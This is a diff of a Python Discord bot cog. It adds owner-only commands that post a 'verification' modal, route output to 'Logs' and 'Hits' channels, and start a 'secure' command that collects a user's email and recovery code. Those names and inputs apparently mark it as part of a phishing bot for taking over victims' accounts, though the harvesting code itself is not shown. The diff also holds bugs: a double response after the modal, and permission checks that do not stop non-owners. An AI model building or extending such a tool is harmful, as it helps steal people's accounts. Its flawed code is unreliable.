@@ -6,8 +6,7 @@ from discord.ext import commands
 
 from views.modals.modal_three import MyModalThree
 
-config = json.load(open("config.json", "r+"))
-owners = config["owners"]
+owners = json.load(open("config.json", "r+"))["owners"]
 
 class MyCog(commands.Cog):
     def __init__(self,  bot):
@@ -16,40 +15,52 @@ class MyCog(commands.Cog):
     @app_commands.command(name="send_embed", description="Sends the verification embed")
     async def verificationEmbed(self, interaction: discord.Interaction):
         if interaction.user.id not in owners:
-            await interaction.response.send_message("You do not have permission to execute this command!", ephemeral=True)
+            await interaction.response.send_message(
+                "You do not have permission to execute this command!", 
+                ephemeral=True
+            )
 
-        if config["discord"]["logs_channel"] == "" or config["discord"]["accounts_channel"] == "":
-            await interaction.response.send_message("You must set the Logs and Accounts Channel First! Do /set_channel for both.")
+        config = json.load(open("config.json", "r+"))
+        
+        if not config["discord"]["logs_channel"] or not config["discord"]["accounts_channel"]:
+            await interaction.response.send_message(
+                "You must set the Logs and Hits channel first with /set_channel!", 
+                ephemeral = True 
+            )
+            
             return
         
         await interaction.response.send_modal(MyModalThree())
+        await interaction.response.send_message(
+            "Embed sent!",
+            ephemeral = True
+        )
 
-    @app_commands.command(name="set_channel", description="Sets your channel ID to where the logs will be saved")
-    @app_commands.describe(channel_id="The channel ID to use")
+    @app_commands.command(name="set_channel", description="Sets your channel IDs")
     @app_commands.choices(
         choice=[
             app_commands.Choice(name="Logs", value="logs_channel"),
-            app_commands.Choice(name="Account", value="accounts_channel"),
+            app_commands.Choice(name="Hits", value="accounts_channel"),
         ]
     )
-    async def setChannels(self, interaction: discord.Interaction, choice: app_commands.Choice[str], channel_id: str):
-
+    async def setChannels(self, interaction: discord.Interaction, choice: app_commands.Choice[str]):
         if interaction.user.id not in owners:
             await interaction.response.send_message("You do not have permission to execute this command!", ephemeral=True)
 
-        with open("config.json", "r") as f:
-            config = json.load(f)
+        with open("config.json", "r+") as config:
 
-        match choice:
-            case "logs_channel":
-                config["discord"]["logs_channel"] = int(channel_id)
-            case "accounts_channel":
-                config["discord"]["accounts_channel"] = int(channel_id)
+            newConfig = json.load(config)
 
-        with open("config.json", "a+") as nconfig:
-            json.dump(config, nconfig, indent = 4)
+            match choice.value:
+                case "logs_channel":
+                    newConfig["discord"]["logs_channel"] = int(interaction.channel_id)
+                case "accounts_channel":
+                    newConfig["discord"]["accounts_channel"] = int(interaction.channel_id)
 
-        await interaction.response.send_message(f"Sucessfully set {choice}!", ephemeral=True)
+            config.seek(0)
+            json.dump(newConfig, config, indent=4)
+
+        await interaction.response.send_message(f"Sucessfully set {choice.name} channel!", ephemeral=True)
 
     @app_commands.command(name="secure", description="Automaticly secures your account")
     async def secure(self, interaction: discord.Interaction, email: str, recoveryCode: str):
